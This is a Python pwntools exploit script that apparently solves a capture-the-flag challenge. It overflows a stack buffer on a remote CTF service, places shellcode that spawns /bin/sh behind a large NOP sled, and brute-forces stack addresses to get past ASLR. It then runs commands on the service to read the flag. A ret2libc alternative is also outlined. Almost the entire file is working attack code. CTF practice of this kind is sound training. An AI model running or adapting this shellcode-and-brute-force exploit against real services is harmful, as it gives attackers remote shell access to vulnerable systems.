#!/usr/bin/env python3
"""
Comprehensive Morris Worm Exploit - Little Bit of Both Challenge
Author: CTF Solver
Created: 2025-11-16
Updated: 2025-11-16
Purpose: Exploit buffer overflow to get shell and read flag
Assumptions:
  - Remote has ASLR enabled on stack
  - Using large NOP sled and brute force approach
  - Target stack address range based on typical 64-bit Linux ASLR
Expected: Find working stack address and retrieve flag
Result: Server currently unreachable - ready for when service is up

THEORY:
"Little Bit of Both" likely refers to having BOTH:
  1. Executable stack (classic shellcode exploitation)
  2. Provided libc (modern ret2libc context)

The solution uses shellcode since:
- Stack is executable (-zexecstack)
- No stack canaries (-fno-stack-protector)
- No PIE (-no-pie) so binary at fixed address

The challenge is ASLR on the stack. Solutions:
  A. Brute force with large NOP sled
  B. Use ret2plt to leak addresses (complex)
  C. Environment variable shellcode (not viable remotely)
"""

from pwn import *
import sys

# Configuration
TARGET_HOST = "exp100-3.pointeroverflowctf.com"
TARGET_PORT = 14667
OFFSET = 552

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'warn'

def create_payload(return_addr):
    """Create exploit payload with shellcode"""
    # Shellcode to spawn /bin/sh
    shellcode = asm(shellcraft.amd64.linux.sh())

    # Large NOP sled for better hit probability
    nop_sled_size = 400
    nop_sled = asm('nop') * nop_sled_size

    # Padding to reach return address
    padding_size = OFFSET - nop_sled_size - len(shellcode)
    padding = b'A' * padding_size

    # Complete payload
    payload = nop_sled + shellcode + padding + p64(return_addr)

    return payload

def try_exploit(addr, attempt_num, total_attempts):
    """Try single exploit attempt"""
    try:
        # Connect to service
        io = remote(TARGET_HOST, TARGET_PORT, timeout=5, level='error')

        # Wait for banner
        io.recvuntil(b'-<>-<>-\n', timeout=2)

        # Send payload
        payload = create_payload(addr)
        io.sendline(payload)

        # Give it a moment to crash or execute
        time.sleep(0.3)

        # Test if we have shell
        io.sendline(b'echo PWNED 2>&1')
        try:
            resp = io.recv(timeout=1)
            if b'PWNED' in resp:
                return io
        except:
            pass

        io.close()
        return None

    except Exception as e:
        return None

def brute_force_stack():
    """Brute force stack addresses with intelligent search"""
    print(f"[*] Little Bit of Both - Morris Worm Exploit")
    print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Buffer overflow offset: {OFFSET} bytes")
    print(f"[*] Strategy: Brute force with large NOP sled\n")

    # Typical 64-bit stack range (varies by system)
    # Ubuntu/Debian typically: 0x7ffffffde000 - 0x7ffffffff000
    # We'll search a wider range with intelligent step size

    base_addresses = [
        0x7ffffffd0000,  # Lower range
        0x7ffffffd8000,
        0x7ffffffe0000,  # Mid range
        0x7ffffffe8000,
        0x7fffffff0000,  # Higher range
    ]

    attempt = 0

    # For each base, try a range with NOP sled alignment
    for base in base_addresses:
        print(f"\n[*] Trying base region: 0x{base:x}")

        # Try 1024 addresses around each base (step by 0x100 for efficiency)
        for offset in range(0, 0x10000, 0x100):
            addr = base + offset
            attempt += 1

            sys.stdout.write(f"\r[*] Attempt {attempt}: 0x{addr:016x}   ")
            sys.stdout.flush()

            shell = try_exploit(addr, attempt, -1)
            if shell:
                print(f"\n\n[+] SUCCESS! Shell at 0x{addr:016x}")
                print(f"[+] Attempts needed: {attempt}")
                print(f"\n[+] Getting flag...")

                shell.sendline(b'cat flag/flag.txt 2>&1')
                time.sleep(0.5)

                try:
                    output = shell.recvall(timeout=3).decode(errors='ignore')
                    print(f"\n{output}")

                    if 'poctf{' in output.lower() or 'flag{' in output.lower():
                        # Extract and save flag
                        for line in output.split('\n'):
                            if '{' in line and '}' in line:
                                print(f"\n[+] FLAG FOUND: {line.strip()}")
                                with open('/home/sean/ctf/Collection/Little Bit of Both/flag.txt', 'w') as f:
                                    f.write(line.strip())
                except:
                    print("[*] Trying interactive mode...")
                    shell.interactive()

                shell.close()
                return True

    print(f"\n\n[-] No success after {attempt} attempts")
    print("[!] Possible issues:")
    print("    - Stack address range incorrect for target system")
    print("    - Need larger NOP sled")
    print("    - ASLR entropy too high")
    return False

def alternative_ret2libc():
    """
    Alternative approach using ret2libc
    Requires ROP gadgets which may not be available
    """
    print("[*] Alternative approach: ret2libc")
    print("[!] This requires pop rdi gadget which appears unavailable")
    print("[!] Would need to:")
    print("    1. Find 'pop rdi; ret' gadget")
    print("    2. Set rdi = address of '/bin/sh' string")
    print("    3. Call system() from libc")
    print("[!] But without info leak, we don't know libc base address")

if __name__ == "__main__":
    print("="*60)
    success = brute_force_stack()

    if not success:
        print("\n" + "="*60)
        alternative_ret2libc()

    print("\n" + "="*60)
    sys.exit(0 if success else 1)
